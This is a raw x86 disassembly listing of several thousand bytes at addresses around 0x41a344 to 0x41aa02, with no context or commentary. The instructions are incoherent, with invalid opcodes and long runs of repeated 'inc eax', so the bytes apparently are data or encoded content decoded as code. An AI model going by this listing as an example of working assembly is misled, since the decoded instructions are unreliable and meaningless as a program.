  41a344:	xor    al,0x67
  41a346:	or     dl,BYTE PTR [esi]
  41a348:	cmp    eax,0x689ab0f0
  41a34d:	or     BYTE PTR [edx],0xe5
  41a350:	ret    
  41a351:	push   esp
  41a352:	add    eax,0xa7a3e66
  41a357:	inc    eax
  41a358:	inc    eax
  41a359:	inc    eax
  41a35a:	inc    eax
  41a35b:	inc    eax
  41a35c:	inc    eax
  41a35d:	inc    eax
  41a35e:	inc    eax
  41a35f:	inc    eax
  41a360:	inc    eax
  41a361:	arpl   WORD PTR [edi+esi*2+0x4f4fa5cb],ax
  41a368:	or     ah,BYTE PTR [edx+0x5]
  41a36b:	stos   DWORD PTR es:[edi],eax
  41a36c:	push   esp
  41a36d:	cwde   
  41a36e:	mov    cl,0x0
  41a370:	or     bh,BYTE PTR [ecx+ecx*8+0x404040bc]
  41a377:	inc    eax
  41a378:	inc    eax
  41a379:	inc    eax
  41a37a:	inc    eax
  41a37b:	inc    eax
  41a37c:	add    BYTE PTR ds:0xaba0573,dl
  41a382:	bound  eax,QWORD PTR [edi+ebp*1-0x35]
  41a386:	test   eax,0xb10a4012
  41a38b:	dec    esi
  41a38c:	daa    
  41a38d:	push   edi
  41a38e:	xchg   esi,eax
  41a38f:	inc    eax
  41a390:	inc    eax
  41a391:	inc    eax
  41a392:	inc    eax
  41a393:	inc    eax
  41a394:	inc    eax
  41a395:	and    eax,0x32404040
  41a39a:	xor    DWORD PTR ds:0x4c5a406e,ebx
  41a3a0:	inc    edx
  41a3a1:	inc    ecx
  41a3a2:	inc    eax
  41a3a3:	or     ch,BYTE PTR [eax-0x42ba07a4]
  41a3a9:	shl    DWORD PTR [ecx],1
  41a3ab:	push   es
  41a3ac:	ret    0x412c
  41a3af:	and    al,0x94
  41a3b1:	jae    0x41a393
  41a3b3:	inc    eax
  41a3b4:	inc    eax
  41a3b5:	inc    eax
  41a3b6:	inc    eax
  41a3b7:	inc    eax
  41a3b8:	inc    eax
  41a3b9:	inc    eax
  41a3ba:	inc    eax
  41a3bb:	inc    eax
  41a3bc:	inc    eax
  41a3bd:	or     eax,0xc158a633
  41a3c2:	adc    eax,0x6197a73
  41a3c7:	xor    BYTE PTR [edi+0x407847c4],al
  41a3cd:	inc    eax
  41a3ce:	inc    eax
  41a3cf:	inc    eax
  41a3d0:	inc    eax
  41a3d1:	inc    eax
  41a3d2:	rol    DWORD PTR [eax+0x40],0xf
  41a3d6:	add    eax,0x9b5ca84c
  41a3db:	out    dx,al
  41a3dc:	cmc    
  41a3dd:	inc    ebx
  41a3de:	or     ah,BYTE PTR [edx+0x10]
  41a3e1:	xlat   BYTE PTR ds:[ebx]
  41a3e2:	sbb    bh,dl
  41a3e4:	daa    
  41a3e5:	add    DWORD PTR [edx],ecx
  41a3e7:	cmp    DWORD PTR [esi+edi*4+0x4e53e015],esp
  41a3ee:	or     bl,BYTE PTR ds:0xd635742
  41a3f4:	inc    eax
  41a3f5:	inc    eax
  41a3f6:	add    BYTE PTR [eax+0x40],al
  41a3f9:	inc    eax
  41a3fa:	inc    eax
  41a3fb:	inc    eax
  41a3fc:	inc    eax
  41a3fd:	jnp    0x41a37f
  41a3ff:	add    BYTE PTR [ecx-0x3686cfd4],ch
  41a405:	cmc    
  41a406:	ss add eax,0x246d2464
  41a40c:	es lahf 
  41a40e:	inc    edx
  41a40f:	adc    eax,0x404062e4
  41a414:	inc    eax
  41a415:	inc    eax
  41a416:	inc    eax
  41a417:	inc    eax
  41a418:	inc    eax
  41a419:	inc    eax
  41a41a:	inc    eax
  41a41b:	inc    eax
  41a41c:	inc    eax
  41a41d:	adc    cl,BYTE PTR [ecx-0x8f5fee9]
  41a423:	inc    ecx
  41a424:	cld    
  41a425:	mov    al,0x73
  41a427:	push   ecx
  41a428:	push   es
  41a429:	or     ah,BYTE PTR [edi]
  41a42b:	adc    BYTE PTR [edx+0x15],0xde
  41a42f:	or     DWORD PTR [ebx+0x7b6d750a],eax
  41a435:	int    0x45
  41a437:	adc    DWORD PTR [esi+0xa],ebp
  41a43a:	bound  ebx,QWORD PTR [esi+0x4040408c]
  41a440:	inc    eax
  41a441:	inc    eax
  41a442:	inc    eax
  41a443:	int3   
  41a444:	jne    0x41a486
  41a446:	adc    DWORD PTR [ebp+0x6d],ecx
  41a449:	or     DWORD PTR [edx],ecx
  41a44b:	inc    ecx
  41a44c:	bound  esp,QWORD PTR [edx-0x54]
  41a44f:	mov    al,ds:0xf40a78d1
  41a454:	dec    eax
  41a455:	inc    ebx
  41a456:	or     eax,0xa9d4fdc
  41a45b:	ret    0x40
  41a45e:	rol    DWORD PTR [eax+0x40],0x40
  41a462:	inc    eax
  41a463:	add    BYTE PTR [eax+0x20],al
  41a466:	enter  0x46cd,0xdd
  41a46a:	scas   eax,DWORD PTR es:[edi]
  41a46b:	or     dl,BYTE PTR [esi]
  41a46d:	in     eax,0x7c
  41a46f:	inc    ebp
  41a470:	mov    ch,0x34
  41a472:	dec    eax
  41a473:	or     al,0xed
  41a475:	bound  ebp,QWORD PTR [eax-0x7e8825e6]
  41a47b:	pcmpgtw mm0,QWORD PTR [edi+0x43]
  41a47f:	aam    0xd
  41a481:	jbe    0x41a4d1
  41a483:	or     dl,BYTE PTR [esp+edx*2+0x32]
  41a487:	dec    edx
  41a488:	pop    ebx
  41a489:	xor    eax,DWORD PTR [eax+0x40]
  41a48c:	inc    eax
  41a48d:	inc    eax
  41a48e:	inc    eax
  41a48f:	inc    eax
  41a490:	inc    eax
  41a491:	inc    eax
  41a492:	inc    DWORD PTR [eax+0x2]
  41a495:	or     ch,BYTE PTR [eax-0x58]
  41a498:	mov    ah,0x30
  41a49a:	jmp    0xb12:0x540a2f47
  41a4a1:	addr16 stc 
  41a4a3:	jno    0x41a4ac
  41a4a5:	or     dl,al
  41a4a7:	inc    eax
  41a4a8:	inc    eax
  41a4a9:	inc    eax
  41a4aa:	inc    eax
  41a4ab:	inc    eax
  41a4ac:	inc    eax
  41a4ad:	inc    eax
  41a4ae:	inc    eax
  41a4af:	inc    eax
  41a4b0:	inc    eax
  41a4b1:	in     al,dx
  41a4b2:	lds    ecx,FWORD PTR ds:0x12044bd8
  41a4b8:	test   al,0x15
  41a4ba:	inc    esi
  41a4bb:	rol    DWORD PTR ds:0x100ba191,0xcd
  41a4c2:	inc    esp
  41a4c3:	rcr    DWORD PTR [ebx-0x41],1
  41a4c6:	inc    BYTE PTR [eax+0x40]
  41a4c9:	inc    eax
  41a4ca:	inc    eax
  41a4cb:	inc    eax
  41a4cc:	inc    eax
  41a4cd:	inc    eax
  41a4ce:	inc    eax
  41a4cf:	add    BYTE PTR [edx],cl
  41a4d1:	dec    eax
  41a4d2:	adc    ebp,eax
  41a4d4:	(bad)  
  41a4d5:	jmp    0x41a526
  41a4d7:	add    DWORD PTR [edx],ecx
  41a4d9:	inc    ecx
  41a4da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4db:	ins    DWORD PTR es:[edi],dx
  41a4dc:	add    edi,eax
  41a4de:	xlat   BYTE PTR ds:[ebx]
  41a4df:	imul   ecx,DWORD PTR [edx],0xc0240d60
  41a4e5:	(bad)  
  41a4e6:	jae    0x41a469
  41a4e8:	or     ch,BYTE PTR [eax]
  41a4ea:	int    0x44
  41a4ec:	arpl   WORD PTR ds:0x63bf41b2,dx
  41a4f2:	inc    eax
  41a4f3:	les    esp,FWORD PTR [ebp+0x40]
  41a4f6:	inc    eax
  41a4f7:	inc    eax
  41a4f8:	inc    eax
  41a4f9:	inc    eax
  41a4fa:	inc    eax
  41a4fb:	and    eax,0x4e404040
  41a500:	or     DWORD PTR [eax+0x1740e940],eax
  41a506:	sub    al,0xff
  41a508:	dec    edi
  41a509:	xchg   edi,eax
  41a50a:	inc    eax
  41a50b:	les    eax,FWORD PTR [ecx-0x58]
  41a50e:	(bad)  
  41a511:	das    
  41a512:	aas    
  41a513:	dec    edi
  41a514:	cwde   
  41a515:	inc    eax
  41a516:	and    dl,ah
  41a518:	dec    edi
  41a519:	pop    ebp
  41a51a:	inc    eax
  41a51b:	inc    ebx
  41a51c:	inc    eax
  41a51d:	inc    eax
  41a51e:	inc    eax
  41a51f:	inc    eax
  41a520:	inc    eax
  41a521:	inc    eax
  41a522:	inc    eax
  41a523:	inc    eax
  41a524:	inc    eax
  41a525:	inc    eax
  41a526:	les    ebp,FWORD PTR [edx]
  41a528:	pusha  
  41a529:	or     eax,0x4c4005df
  41a52e:	dec    edi
  41a52f:	inc    ecx
  41a530:	bound  eax,QWORD PTR [ecx+0x77]
  41a533:	push   ebp
  41a534:	inc    eax
  41a535:	cmp    eax,0xc328964e
  41a53a:	pop    ss
  41a53b:	add    DWORD PTR [eax-0x3d],eax
  41a53e:	inc    ecx
  41a53f:	and    BYTE PTR [eax],ch
  41a541:	das    
  41a542:	push   eax
  41a543:	ja     0x41a585
  41a545:	mov    al,0xcc
  41a547:	jne    0x41a56e
  41a549:	stc    
  41a54a:	inc    eax
  41a54b:	inc    eax
  41a54c:	inc    eax
  41a54d:	inc    eax
  41a54e:	inc    eax
  41a54f:	inc    eax
  41a550:	rol    DWORD PTR [eax+0x40],0xff
  41a554:	add    BYTE PTR [eax+0x15],0xf8
  41a558:	je     0x41a58e
  41a55a:	rcr    BYTE PTR [ecx+0x10],cl
  41a55d:	inc    eax
  41a55e:	leave  
  41a55f:	ret    
  41a560:	bound  esp,QWORD PTR [edx+0x5]
  41a563:	repz adc BYTE PTR [eax-0x58],al
  41a567:	mov    edi,0x9f41606b
  41a56c:	push   ds
  41a56d:	dec    DWORD PTR [eax-0x41]
  41a570:	loopne 0x41a57e
  41a572:	pop    ebx
  41a573:	inc    eax
  41a574:	inc    eax
  41a575:	add    BYTE PTR [eax+0x40],al
  41a578:	inc    eax
  41a579:	inc    eax
  41a57a:	inc    eax
  41a57b:	inc    eax
  41a57c:	pop    edx
  41a57d:	outs   dx,BYTE PTR ds:[esi]
  41a57e:	inc    eax
  41a57f:	xor    eax,0xc8636573
  41a584:	jno    0x41a5c6
  41a586:	inc    eax
  41a587:	int3   
  41a588:	cs jns 0x41a5d0
  41a58b:	sub    eax,0x94403440
  41a590:	test   al,0x34
  41a592:	int3   
  41a593:	clc    
  41a594:	push   eax
  41a595:	inc    eax
  41a596:	inc    eax
  41a597:	inc    eax
  41a598:	inc    eax
  41a599:	inc    eax
  41a59a:	inc    eax
  41a59b:	inc    eax
  41a59c:	inc    eax
  41a59d:	inc    eax
  41a59e:	inc    eax
  41a59f:	sub    al,0xbf
  41a5a1:	or     eax,0xd0ca4c44
  41a5a6:	jns    0x41a528
  41a5a8:	mov    edi,0x6f325ecd
  41a5ad:	pop    edi
  41a5ae:	pop    ecx
  41a5af:	add    al,BYTE PTR [eax+0x4c]
  41a5b2:	and    al,0x4d
  41a5b4:	gs scas eax,DWORD PTR es:[edi]
  41a5b6:	jno    0x41a5cf
  41a5b8:	inc    eax
  41a5b9:	xor    eax,0xce622c84
  41a5be:	inc    eax
  41a5bf:	inc    eax
  41a5c0:	inc    eax
  41a5c1:	inc    eax
  41a5c2:	inc    eax
  41a5c3:	inc    eax
  41a5c4:	int3   
  41a5c5:	jne    0x41a607
  41a5c7:	pop    ecx
  41a5c8:	call   0x5246e80d
  41a5cd:	dec    esp
  41a5ce:	or     eax,0x434001fb
  41a5d3:	xchg   eax,eax
  41a5d5:	jnp    0x41a5e5
  41a5d7:	xor    BYTE PTR [ebp+0x40],al
  41a5da:	adc    ch,BYTE PTR [esi+0x40]
  41a5dd:	add    cl,al
  41a5df:	inc    eax
  41a5e0:	inc    eax
  41a5e1:	inc    eax
  41a5e2:	inc    eax
  41a5e3:	add    BYTE PTR [eax+0x49],al
  41a5e6:	xor    eax,0x408011f6
  41a5eb:	fsubr  st(3),st
  41a5ed:	and    eax,0x3944f963
  41a5f2:	inc    eax
  41a5f3:	bound  esp,QWORD PTR [ebp+0x39]
  41a5f6:	lods   al,BYTE PTR ds:[esi]
  41a5f7:	int3   
  41a5f8:	rol    BYTE PTR [eax+0x40],1
  41a5fb:	inc    eax
  41a5fc:	inc    eax
  41a5fd:	inc    eax
  41a5fe:	inc    eax
  41a5ff:	inc    eax
  41a600:	inc    eax
  41a601:	inc    DWORD PTR [eax+0x42]
  41a604:	inc    eax
  41a605:	stos   DWORD PTR es:[edi],eax
  41a606:	sub    BYTE PTR [eax-0x7fd3fa58],0x40
  41a60d:	mov    al,0x5d
  41a60f:	adc    cl,BYTE PTR [edi+eiz*2]
  41a612:	sahf   
  41a613:	add    eax,DWORD PTR [eax+0x5]
  41a616:	leave  
  41a617:	mov    al,ds:0x1a2feb46
  41a61c:	inc    eax
  41a61d:	leave  
  41a61e:	add    BYTE PTR [eax+0x40],0x40
  41a622:	inc    eax
  41a623:	inc    eax
  41a624:	inc    eax
  41a625:	inc    eax
  41a626:	inc    eax
  41a627:	inc    eax
  41a628:	inc    eax
  41a629:	inc    ecx
  41a62a:	(bad)  
  41a62b:	clc    
  41a62c:	rol    DWORD PTR [esi+0x40],1
  41a62f:	lods   al,BYTE PTR ds:[esi]
  41a630:	inc    esi
  41a631:	jle    0x41a643
  41a633:	retf   0x143
  41a636:	inc    eax
  41a637:	inc    edx
  41a638:	mov    ch,0x90
  41a63a:	jbe    0x41a68b
  41a63c:	jo     0x41a63d
  41a63e:	inc    eax
  41a63f:	ja     0x41a63f
  41a641:	(bad)  
  41a642:	aad    0xca
  41a644:	xor    al,0x1
  41a646:	mov    edi,0x33600d80
  41a64b:	enter  0xd5e9,0x40
  41a64f:	push   edx
  41a650:	inc    eax
  41a651:	inc    eax
  41a652:	inc    eax
  41a653:	inc    eax
  41a654:	inc    eax
  41a655:	inc    eax
  41a656:	inc    eax
  41a657:	inc    eax
  41a658:	add    BYTE PTR [ecx+0x2a],al
  41a65b:	or     DWORD PTR [edi+0x52],ecx
  41a65e:	add    DWORD PTR [eax-0x37],0xa9a88bc2
  41a665:	sub    DWORD PTR [edx+0x47],esp
  41a668:	mov    BYTE PTR [esi],dl
  41a66a:	(bad)  
  41a66b:	adc    esi,eax
  41a66d:	inc    ecx
  41a66e:	push   es
  41a66f:	inc    eax
  41a670:	adc    eax,0x4f5062f9
  41a675:	push   eax
  41a676:	sub    al,0x40
  41a678:	int    0xfc
  41a67a:	sub    BYTE PTR [eax+0x40],al
  41a67d:	inc    eax
  41a67e:	inc    eax
  41a67f:	inc    eax
  41a680:	inc    eax
  41a681:	and    eax,0xd404040
  41a686:	test   eax,0x4e402e37
  41a68b:	add    eax,0x30c4cb40
  41a690:	add    DWORD PTR [eax+0x35],0x4f44ad41
  41a697:	pop    ebp
  41a698:	inc    edx
  41a699:	mov    edi,0x507b4241
  41a69e:	test   eax,0x4cbf8195
  41a6a3:	les    ebx,FWORD PTR [eax-0x24]
  41a6a6:	inc    eax
  41a6a7:	inc    eax
  41a6a8:	inc    eax
  41a6a9:	inc    eax
  41a6aa:	inc    eax
  41a6ab:	inc    eax
  41a6ac:	inc    eax
  41a6ad:	inc    eax
  41a6ae:	inc    eax
  41a6af:	inc    eax
  41a6b0:	ret    0x5457
  41a6b3:	(bad)  
  41a6b4:	cmp    eax,0x4f676209
  41a6b9:	aas    
  41a6ba:	cmp    BYTE PTR [edi+0x4017f8c3],0x40
  41a6c1:	inc    eax
  41a6c2:	inc    eax
  41a6c3:	inc    eax
  41a6c4:	inc    eax
  41a6c5:	rol    DWORD PTR [eax+0x40],0xf
  41a6c9:	test   eax,0x4740b750
  41a6ce:	cli    
  41a6cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6d0:	fadd   st(0),st
  41a6d2:	adc    al,0x35
  41a6d4:	inc    eax
  41a6d5:	popa   
  41a6d6:	adc    eax,0x6905f962
  41a6db:	jne    0x41a71d
  41a6dd:	dec    eax
  41a6de:	inc    ecx
  41a6df:	or     al,0xa9
  41a6e1:	leave  
  41a6e2:	outs   dx,DWORD PTR ds:[esi]
  41a6e3:	add    BYTE PTR [eax+0x65],0x5e
  41a6e7:	pushf  
  41a6e8:	mov    ah,0x26
  41a6ea:	shl    DWORD PTR [ecx],cl
  41a6ec:	inc    eax
  41a6ed:	rol    BYTE PTR [eax+0x40],0x0
  41a6f1:	inc    eax
  41a6f2:	inc    eax
  41a6f3:	inc    eax
  41a6f4:	inc    eax
  41a6f5:	inc    eax
  41a6f6:	inc    eax
  41a6f7:	in     al,dx
  41a6f8:	inc    ebp
  41a6f9:	sbb    DWORD PTR [ecx+0x5f],eax
  41a6fc:	push   esp
  41a6fd:	inc    eax
  41a6fe:	mov    dl,bh
  41a700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a701:	retf   
  41a702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a703:	icebp  
  41a704:	or     eax,0x5f89c41
  41a709:	pop    eax
  41a70a:	and    BYTE PTR [ecx-0x30],ch
  41a70d:	jae    0x41a71c
  41a70f:	or     eax,0xb1441986
  41a714:	add    BYTE PTR [eax-0x37],al
  41a717:	inc    ebp
  41a718:	inc    eax
  41a719:	leave  
  41a71a:	sub    al,0x40
  41a71c:	inc    eax
  41a71d:	inc    eax
  41a71e:	inc    eax
  41a71f:	inc    eax
  41a720:	inc    eax
  41a721:	inc    eax
  41a722:	inc    eax
  41a723:	inc    eax
  41a724:	inc    eax
  41a725:	ja     0x41a79b
  41a727:	aas    
  41a728:	rol    DWORD PTR es:[edx+0x54],cl
  41a72c:	xor    edi,DWORD PTR ds:0x69048940
  41a733:	sbb    ebp,edx
  41a735:	pop    ebp
  41a736:	add    al,BYTE PTR [eax+0x73]
  41a739:	stc    
  41a73a:	enter  0x7bc9,0x18
  41a73e:	ins    DWORD PTR es:[edi],dx
  41a73f:	inc    eax
  41a740:	call   0x4040:0x40404040
  41a747:	int3   
  41a748:	jne    0x41a78a
  41a74a:	not    BYTE PTR [eax+edx*2-0x1a]
  41a74e:	lahf   
  41a74f:	sbb    al,BYTE PTR [eax+0x5]
  41a752:	add    eax,0x68443786
  41a757:	sbb    al,0x44
  41a759:	inc    ebp
  41a75a:	inc    ecx
  41a75b:	inc    eax
  41a75c:	jno    0x41a78a
  41a75e:	inc    eax
  41a75f:	add    BYTE PTR [eax-0xc],0x58
  41a763:	mov    ds:0x13603c67,al
  41a768:	dec    edx
  41a769:	xor    al,0xf8
  41a76b:	add    eax,0x40c10040
  41a770:	inc    eax
  41a771:	inc    eax
  41a772:	inc    eax
  41a773:	add    BYTE PTR [eax+0x6b],al
  41a776:	int    0x4e
  41a778:	inc    eax
  41a779:	inc    eax
  41a77a:	gs clc 
  41a77c:	xchg   al,bl
  41a77e:	inc    edx
  41a77f:	pop    ebp
  41a780:	adc    al,BYTE PTR [eax]
  41a782:	cwde   
  41a783:	hlt    
  41a784:	inc    eax
  41a785:	add    edi,esi
  41a787:	dec    esi
  41a788:	inc    eax
  41a789:	mov    BYTE PTR ds:0x4484a156,dl
  41a78f:	pop    edi
  41a790:	pusha  
  41a791:	inc    ebx
  41a792:	(bad)  
  41a793:	mov    dl,0x5
  41a795:	inc    eax
  41a796:	inc    eax
  41a797:	inc    eax
  41a798:	inc    eax
  41a799:	inc    eax
  41a79a:	inc    eax
  41a79b:	inc    eax
  41a79c:	inc    eax
  41a79d:	inc    DWORD PTR [eax+0x6b]
  41a7a0:	sub    al,0x4e
  41a7a2:	inc    ecx
  41a7a3:	inc    ebx
  41a7a4:	dec    edx
  41a7a5:	repnz xchg ah,bh
  41a7a8:	cmp    bl,BYTE PTR [edi+0x0]
  41a7ab:	inc    ebx
  41a7ac:	fs or  eax,0x40c56c40
  41a7b2:	xor    bh,BYTE PTR [edi-0x175fa306]
  41a7b8:	inc    edx
  41a7b9:	push   ebp
  41a7ba:	ret    0x4041
  41a7bd:	inc    eax
  41a7be:	inc    eax
  41a7bf:	inc    eax
  41a7c0:	inc    eax
  41a7c1:	inc    eax
  41a7c2:	inc    eax
  41a7c3:	inc    eax
  41a7c4:	inc    eax
  41a7c5:	inc    eax
  41a7c6:	xchg   esi,eax
  41a7c7:	out    0x5,al
  41a7c9:	mov    al,0xfe
  41a7cb:	push   edi
  41a7cc:	inc    esp
  41a7cd:	inc    ecx
  41a7ce:	or     eax,0x5f0586f9
  41a7d3:	pop    edi
  41a7d4:	add    BYTE PTR [ecx-0x2a],0xf0
  41a7d8:	dec    edx
  41a7d9:	retf   
  41a7da:	and    BYTE PTR [edi+0x40],bl
  41a7dd:	inc    eax
  41a7de:	inc    eax
  41a7df:	inc    eax
  41a7e0:	inc    eax
  41a7e1:	inc    eax
  41a7e2:	inc    eax
  41a7e3:	inc    eax
  41a7e4:	add    BYTE PTR ds:0x7305b743,ah
  41a7ea:	jg     0x41a824
  41a7ec:	dec    edi
  41a7ed:	push   0xffffff86
  41a7ef:	gs inc edx
  41a7f1:	sbb    al,0x13
  41a7f3:	aad    0x35
  41a7f5:	add    DWORD PTR [esp+edx*4+0x404040e7],0x25404040
  41a800:	inc    eax
  41a801:	inc    eax
  41a802:	inc    eax
  41a803:	bound  esp,QWORD PTR [ebx+0x7f]
  41a806:	inc    eax
  41a807:	arpl   WORD PTR [esi+eax*2-0x9915608],ax
  41a80e:	xor    DWORD PTR [ecx-0x6f1156bd],eax
  41a814:	xor    BYTE PTR [edx+0x2c],bl
  41a817:	push   edx
  41a818:	inc    eax
  41a819:	xchg   edx,eax
  41a81a:	adc    eax,0x4040b4bf
  41a81f:	inc    eax
  41a820:	inc    eax
  41a821:	inc    eax
  41a822:	inc    eax
  41a823:	inc    eax
  41a824:	inc    eax
  41a825:	inc    eax
  41a826:	inc    eax
  41a827:	cmp    al,0xfd
  41a829:	add    DWORD PTR [ecx-0x13],eax
  41a82c:	inc    ecx
  41a82d:	inc    eax
  41a82e:	add    dh,BYTE PTR [esi]
  41a830:	inc    ebx
  41a831:	dec    edi
  41a832:	mov    edi,0xd141c325
  41a837:	int    0xbf
  41a839:	add    edi,DWORD PTR [edi+0x40404040]
  41a83f:	inc    eax
  41a840:	inc    eax
  41a841:	rol    DWORD PTR [eax+0x40],0x63
  41a845:	sbb    DWORD PTR [ebx+0x63],eax
  41a848:	gs sub eax,0xfa904100
  41a84e:	sub    BYTE PTR [ebp-0x1e],al
  41a851:	pop    edi
  41a852:	add    BYTE PTR [ebx+0xd],0xec
  41a856:	adc    DWORD PTR [ecx],0x5f
  41a859:	add    DWORD PTR [ecx],ebp
  41a85b:	inc    eax
  41a85c:	inc    eax
  41a85d:	add    BYTE PTR [eax+0x40],al
  41a860:	inc    eax
  41a861:	inc    eax
  41a862:	inc    eax
  41a863:	inc    eax
  41a864:	inc    ecx
  41a865:	jmp    0x41a874
  41a867:	ins    BYTE PTR es:[edi],dx
  41a868:	enter  0xdf20,0xfe
  41a86c:	inc    ecx
  41a86d:	mov    dl,0x41
  41a86f:	gs mov esi,0x823fc434
  41a875:	inc    eax
  41a876:	inc    eax
  41a877:	inc    eax
  41a878:	inc    eax
  41a879:	inc    eax
  41a87a:	inc    eax
  41a87b:	inc    eax
  41a87c:	inc    eax
  41a87d:	inc    eax
  41a87e:	inc    eax
  41a87f:	fs push esp
  41a881:	push   esp
  41a882:	adc    eax,0x80817fc5
  41a887:	stc    
  41a888:	enter  0xca0d,0x4b
  41a88c:	rcl    BYTE PTR [edx+0x40],0x40
  41a890:	inc    eax
  41a891:	inc    eax
  41a892:	inc    eax
  41a893:	inc    eax
  41a894:	int3   
  41a895:	jne    0x41a8d7
  41a897:	inc    eax
  41a898:	mov    ss,WORD PTR [ebx]
  41a89a:	jp     0x41a8ec
  41a89c:	(bad)  
  41a89d:	jg     0x41a822
  41a89f:	inc    esp
  41a8a0:	icebp  
  41a8a1:	stc    
  41a8a2:	in     eax,dx
  41a8a3:	inc    esp
  41a8a4:	clc    
  41a8a5:	mov    edi,0x449a4032
  41a8aa:	push   edx
  41a8ab:	inc    eax
  41a8ac:	add    cl,al
  41a8ae:	inc    eax
  41a8af:	inc    eax
  41a8b0:	inc    eax
  41a8b1:	inc    eax
  41a8b2:	add    BYTE PTR [eax+0x69],al
  41a8b5:	clc    
  41a8b6:	sub    eax,0x46664601
  41a8bb:	inc    esi
  41a8bc:	jl     0x41a8d3
  41a8be:	aas    
  41a8bf:	inc    ebx
  41a8c0:	inc    eax
  41a8c1:	mov    ebx,ds
  41a8c3:	push   ecx
  41a8c4:	(bad)  
  41a8c5:	leave  
  41a8c6:	dec    esi
  41a8c7:	add    eax,DWORD PTR [ecx+0x15]
  41a8ca:	(bad)  
  41a8cb:	leave  
  41a8cc:	enter  0x1326,0x3
  41a8d0:	inc    ecx
  41a8d1:	jmp    0x4040:0x404040a8
  41a8d8:	inc    eax
  41a8d9:	inc    eax
  41a8da:	inc    eax
  41a8db:	inc    DWORD PTR [eax+0x49]
  41a8de:	mov    edi,0x41810692
  41a8e3:	sbb    dl,BYTE PTR [eax]
  41a8e5:	cmp    al,0x5
  41a8e7:	jae    0x41a93c
  41a8e9:	ja     0x41a875
  41a8eb:	gs cwde 
  41a8ed:	cmp    dl,cl
  41a8ef:	not    al
  41a8f1:	add    eax,0x88418abf
  41a8f6:	push   eax
  41a8f7:	inc    ebp
  41a8f8:	jl     0x41a949
  41a8fa:	inc    eax
  41a8fb:	inc    eax
  41a8fc:	inc    eax
  41a8fd:	inc    eax
  41a8fe:	inc    eax
  41a8ff:	inc    eax
  41a900:	inc    eax
  41a901:	inc    eax
  41a902:	inc    eax
  41a903:	inc    eax
  41a904:	inc    eax
  41a905:	in     eax,dx
  41a906:	arpl   WORD PTR [edx+0x15],sp
  41a909:	dec    ebp
  41a90a:	rol    BYTE PTR ds:0x3c409140,1
  41a910:	retf   
  41a911:	mov    al,ds:0x6640c37f
  41a916:	gs sahf 
  41a918:	inc    esp
  41a919:	hlt    
  41a91a:	lds    eax,FWORD PTR [ecx-0x57bc7741]
  41a920:	dec    esi
  41a921:	add    eax,0xf5bfbfdf
  41a926:	mov    esp,0x40406012
  41a92b:	inc    eax
  41a92c:	inc    eax
  41a92d:	inc    eax
  41a92e:	inc    eax
  41a92f:	inc    eax
  41a930:	inc    eax
  41a931:	add    BYTE PTR [edx+0xc],cl
  41a934:	out    0xbf,eax
  41a936:	in     eax,dx
  41a937:	fs inc ecx
  41a939:	push   edx
  41a93a:	cli    
  41a93b:	adc    eax,0x2664bf01
  41a940:	or     DWORD PTR [ecx+0x4042fbf8],ebp
  41a946:	outs   dx,BYTE PTR ds:[esi]
  41a947:	mov    WORD PTR [bx+di-0xe],es
  41a94b:	mov    ebp,0x74f84002
  41a950:	(bad)  
  41a951:	enter  0x4015,0x30
  41a955:	inc    edx
  41a956:	inc    eax
  41a957:	inc    eax
  41a958:	inc    eax
  41a959:	inc    eax
  41a95a:	inc    eax
  41a95b:	inc    eax
  41a95c:	and    eax,0x4404040
  41a961:	inc    esp
  41a962:	sub    bh,BYTE PTR [eax+0x426f504b]
  41a968:	repnz mov bh,0xeb
  41a96b:	or     eax,0x428177ff
  41a970:	(bad)  
  41a971:	out    dx,al
  41a972:	and    eax,0x4315fa43
  41a977:	inc    edx
  41a978:	inc    eax
  41a979:	inc    eax
  41a97a:	inc    eax
  41a97b:	inc    eax
  41a97c:	inc    eax
  41a97d:	inc    eax
  41a97e:	inc    eax
  41a97f:	inc    eax
  41a980:	inc    eax
  41a981:	inc    eax
  41a982:	out    dx,al
  41a983:	cwde   
  41a984:	adc    BYTE PTR [eax+esi*8-0x5f77fb07],dh
  41a98b:	xor    esi,DWORD PTR [eax+0x35dc0d0d]
  41a991:	xchg   BYTE PTR [eax+0x40],al
  41a994:	inc    eax
  41a995:	inc    eax
  41a996:	inc    eax
  41a997:	inc    eax
  41a998:	rol    DWORD PTR [eax+0x40],0x5
  41a99c:	ror    DWORD PTR [ebx+ecx*8+0x4b],1
  41a9a0:	lahf   
  41a9a1:	inc    esp
  41a9a2:	inc    eax
  41a9a3:	xchg   DWORD PTR [esi+ebx*2+0x117ff82],esi
  41a9aa:	inc    eax
  41a9ab:	sub    al,0xd
  41a9ad:	push   ebx
  41a9ae:	jae    0x41a9a9
  41a9b0:	push   ebp
  41a9b1:	gs inc edx
  41a9b3:	and    cl,bl
  41a9b5:	int    0x4a
  41a9b7:	out    dx,al
  41a9b8:	inc    ebp
  41a9b9:	xchg   edi,eax
  41a9ba:	inc    eax
  41a9bb:	call   0x40823221
  41a9c0:	add    BYTE PTR [eax+0x40],al
  41a9c3:	inc    eax
  41a9c4:	inc    eax
  41a9c5:	inc    eax
  41a9c6:	inc    eax
  41a9c7:	push   esp
  41a9c8:	inc    ebx
  41a9c9:	xlat   BYTE PTR ds:[ebx]
  41a9ca:	fwait
  41a9cb:	push   esp
  41a9cc:	jl     0x41aa0f
  41a9ce:	jge    0x41a9c6
  41a9d0:	stos   BYTE PTR es:[edi],al
  41a9d1:	rcr    DWORD PTR [edi+0x40],cl
  41a9d4:	test   al,0x61
  41a9d6:	arpl   WORD PTR [eax+0x40],ax
  41a9d9:	inc    eax
  41a9da:	inc    eax
  41a9db:	inc    eax
  41a9dc:	inc    eax
  41a9dd:	inc    eax
  41a9de:	inc    eax
  41a9df:	inc    eax
  41a9e0:	inc    eax
  41a9e1:	dec    edi
  41a9e2:	in     al,dx
  41a9e3:	mov    edi,0xd8054002
  41a9e8:	bound  ebp,QWORD PTR [ebp+edx*1-0x78bbdbf0]
  41a9ef:	addr16 in al,dx
  41a9f1:	or     eax,0x4348904b
  41a9f6:	jno    0x41aa3d
  41a9f8:	dec    esp
  41a9f9:	retf   
  41a9fa:	(bad)  
  41a9fb:	inc    DWORD PTR [eax]
  41a9fd:	inc    ebx
  41a9fe:	nop
  41a9ff:	xor    DWORD PTR [eax],esi
  41aa01:	dec    edi
  41aa02:	cli    
